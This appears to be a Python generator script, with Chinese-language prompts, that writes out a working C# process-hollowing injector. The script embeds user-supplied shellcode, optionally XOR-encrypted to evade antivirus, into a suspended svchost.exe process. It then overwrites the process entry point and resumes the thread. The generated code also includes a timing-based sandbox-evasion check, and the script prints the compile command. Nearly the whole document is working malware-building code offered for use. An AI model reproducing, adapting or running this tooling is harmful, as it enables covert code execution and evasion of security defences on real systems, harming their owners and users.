#!/usr/bin/env python3
import re
import os
import sys
from textwrap import dedent

def parse_shellcode():
    print("\n[+] 请粘贴Shellcode（支持多行，格式如：0xfc,0x48,... 或 fc4883e4...），粘贴后按回车输入空行结束：")
    content = []
    while True:
        line = input().strip()
        if not line:
            break
        content.append(line)
    content = ' '.join(content)

    # 增强型正则匹配
    patterns = [
        (r'(0x[0-9a-fA-F]{2},?\s*)+', r'0x([0-9a-fA-F]{2})'),          # C#数组格式
        (r'(\\x[0-9a-fA-F]{2})+', r'\\x([0-9a-fA-F]{2})'),            # \x格式
        (r'([0-9a-fA-F]{2}\s*)+', r'([0-9a-fA-F]{2})')                # 连续hex格式
    ]

    bytes_list = []
    for pattern, extract_pattern in patterns:
        matches = re.findall(pattern, content, re.IGNORECASE)
        if not matches:
            continue

        hex_values = []
        for match in re.finditer(extract_pattern, content, re.IGNORECASE):
            hex_values.append(f"0x{match.group(1).lower()}")

        if hex_values:
            bytes_list = hex_values
            break

    if not bytes_list:
        raise ValueError("无法识别的shellcode格式")

    return ',\n'.join(bytes_list)

def get_input(prompt, default, validator=None):
    while True:
        user_input = input(f"{prompt} (默认: {default}): ").strip()
        if not user_input:
            user_input = default
            
        if validator:
            try:
                validator(user_input)
            except ValueError as e:
                print(f"错误: {str(e)}")
                continue
                
        return user_input

def validate_key(key):
    try:
        int(key, 0)  # 支持十六进制和十进制
    except ValueError:
        raise ValueError("无效的密钥格式（支持十进制或0x前缀十六进制）")
    return True

def validate_filename(name):
    if not name:
        raise ValueError("文件名不能为空")
    if '/' in name or '\\' in name:
        raise ValueError("文件名包含非法字符")
    return True

def main():
    print("\n[+] Process Hollowing 代码生成工具（安全增强版）")
    print("[!] 警告：本工具将生成针对svchost.exe进程的注入代码")

    # 获取免杀选项
    bypass_av = get_input("启用免杀功能？ (y/n)", "n", lambda x: x.lower() in ['y', 'n']).lower() == 'y'
    
    xor_key = 0x00
    if bypass_av:
        xor_key = get_input(
            "输入XOR密钥（十进制或0x十六进制）",
            "0xfa",
            validate_key
        )
        xor_key = int(xor_key, 0)

    byte_str = parse_shellcode()
    
    # 加密处理
    if bypass_av:
        encrypted_bytes = []
        for b in byte_str.split(','):
            original = int(b.strip().replace('0x',''), 16)
            encrypted = original ^ xor_key
            encrypted_bytes.append(f"0x{encrypted:02x}")
        byte_str = ',\n'.join(encrypted_bytes)

    # 完整代码模板
    template = f"""using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Threading;

namespace ProcessHollowing
{{
    class Program
    {{
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {{
            public int cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public int dwX;
            public int dwY;
            public int dwXSize;
            public int dwYSize;
            public int dwXCountChars;
            public int dwYCountChars;
            public int dwFillAttribute;
            public int dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }}

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {{
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }}

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_BASIC_INFORMATION
        {{
            public IntPtr Reserved1;
            public IntPtr PebBaseAddress;
            public IntPtr Reserved2_0;
            public IntPtr Reserved2_1;
            public IntPtr UniqueProcessId;
            public IntPtr Reserved3;
        }}

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern int NtQueryInformationProcess(
            IntPtr hProcess,
            int procInformationClass,
            ref PROCESS_BASIC_INFORMATION procInformation,
            uint ProcInfoLen,
            ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            [Out] byte[] lpBuffer,
            int dwSize,
            out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            int nSize,
            out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        static void Main()
        {{
            // 防沙箱检测
            DateTime t1 = DateTime.Now;
            Sleep(10000);
            double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
            if (deltaT < 9.5) return;

            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            
            try
            {{
                // 创建挂起的svchost.exe进程
                STARTUPINFO si = new STARTUPINFO();
                si.cb = Marshal.SizeOf(si);

                bool success = CreateProcess(
                    null,
                    @"C:\\Windows\\System32\\svchost.exe",
                    IntPtr.Zero,
                    IntPtr.Zero,
                    false,
                    0x00000004, // CREATE_SUSPENDED
                    IntPtr.Zero,
                    null,
                    ref si,
                    out pi);

                if (!success)
                    throw new Win32Exception(Marshal.GetLastWin32Error());

                // 获取进程基本信息
                PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
                uint returnLength = 0;
                int status = NtQueryInformationProcess(
                    pi.hProcess,
                    0,
                    ref pbi,
                    (uint)Marshal.SizeOf(pbi),
                    ref returnLength);

                if (status != 0)
                    throw new Win32Exception(status);

                // 计算PEB偏移量
                IntPtr pebOffset = (IntPtr)(Environment.Is64BitProcess ?
                    (long)pbi.PebBaseAddress + 0x10 :
                    (int)pbi.PebBaseAddress + 0x8);

                byte[] addrBuf = new byte[Environment.Is64BitProcess ? 8 : 4];
                IntPtr bytesRead;

                if (!ReadProcessMemory(
                    pi.hProcess,
                    pebOffset,
                    addrBuf,
                    addrBuf.Length,
                    out bytesRead))
                {{
                    throw new Win32Exception(Marshal.GetLastWin32Error());
                }}

                IntPtr imageBase = Environment.Is64BitProcess ?
                    (IntPtr)BitConverter.ToInt64(addrBuf, 0) :
                    (IntPtr)BitConverter.ToInt32(addrBuf, 0);

                // 读取PE头
                byte[] peHeader = new byte[0x200];
                if (!ReadProcessMemory(pi.hProcess, imageBase, peHeader, peHeader.Length, out bytesRead))
                    throw new Win32Exception(Marshal.GetLastWin32Error());

                // 验证PE签名
                if (peHeader[0] != 'M' || peHeader[1] != 'Z')
                    throw new ApplicationException("Invalid PE header");

                // 获取入口点地址
                uint e_lfanew = BitConverter.ToUInt32(peHeader, 0x3C);
                uint entryPointRva = BitConverter.ToUInt32(peHeader, (int)(e_lfanew + 0x28));
                IntPtr entryPointAddress = (IntPtr)((long)imageBase + entryPointRva);

                // 处理payload
                byte[] buf = new byte[] {{
                    {byte_str}
                }};

                {(f"// 解密payload\n" + 
                f"for (int i = 0; i < buf.Length; i++)\n" +
                f"{{\n" +
                f"    buf[i] = (byte)(buf[i] ^ {hex(xor_key)});\n" +
                f"}}") if bypass_av else ""}

                // 写入shellcode
                IntPtr bytesWritten;
                if (!WriteProcessMemory(
                    pi.hProcess,
                    entryPointAddress,
                    buf,
                    buf.Length,
                    out bytesWritten))
                {{
                    throw new Win32Exception(Marshal.GetLastWin32Error());
                }}

                // 恢复线程执行
                uint resumeResult = ResumeThread(pi.hThread);
                if (resumeResult == 0xFFFFFFFF)
                    throw new Win32Exception(Marshal.GetLastWin32Error());
            }}
            catch (Exception ex)
            {{
                Console.WriteLine("错误: {{0}}", ex.Message);
            }}
            finally
            {{
                if (pi.hProcess != IntPtr.Zero)
                    CloseHandle(pi.hProcess);
                if (pi.hThread != IntPtr.Zero)
                    CloseHandle(pi.hThread);
            }}
        }}
    }}
}}"""

    output_file = get_input(
        "输入输出文件名",
        "ProcessHollowing.cs",
        validate_filename
    )

    try:
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(dedent(template))
        print(f"\n[+] 成功生成注入代码: {output_file}")
        print("[!] 编译命令：csc /platform:x64 /unsafe /out:Injector.exe {0}".format(output_file))
        print("[!] 注意：请根据目标系统架构选择正确的编译平台（x86/x64）")
    except Exception as e:
        print(f"错误: 文件写入失败 - {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    main()